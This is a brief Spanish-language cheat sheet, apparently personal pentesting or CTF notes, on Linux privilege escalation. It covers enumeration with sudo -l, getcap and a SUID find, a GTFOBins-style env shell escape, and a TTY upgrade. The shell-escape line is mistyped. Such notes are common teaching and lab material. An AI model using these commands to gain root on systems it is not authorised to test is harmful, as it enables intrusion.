Primero de todo vamos a comprobar la versión de Linux con el siguiente comando

```shell
lsb_release -a
```

## Escalada de privilegios sudo -l
* Probamos a ejecutar la siguiente instrucción y comprobar que archivos puedo ejecutar como root.

```shell
sudo -l
```

A partir de ahí podemos buscar la carpeta y el exploit que se sirve de ello para poder entablar una rever shell

## Escalada de privilegios básico de las CAPABILITIES

```shell
getcap -r / 2>/dev/null
```


Se lista aquellos paquetes o servicios que puedo ejecutar como root.

```shell 
#Ejemplo
/usr/bin/perl = cap_setuid+ep
```

## Escalada de privilegios de binarios

* Buscamos los archivos que podemos ejecutar como root con el usuario actual
```shell
find / -perm -4000 2>/dev/null
```

consultamos el binario en GTFobins y buscamos si hay algun binario si podemos ejecutarlo con los permisos SUID.

El exploit tenemos que poner la ruta completa.

```shell
usr/bin/env /bn/sh -p 
```





# Tratamiento de la TTY 

En el caso de que no nos aparezca el promt tenemos que hacer el tratamiento de la tty 
ponemos lo siguiente:

```shell
script /dev/null -c bash
```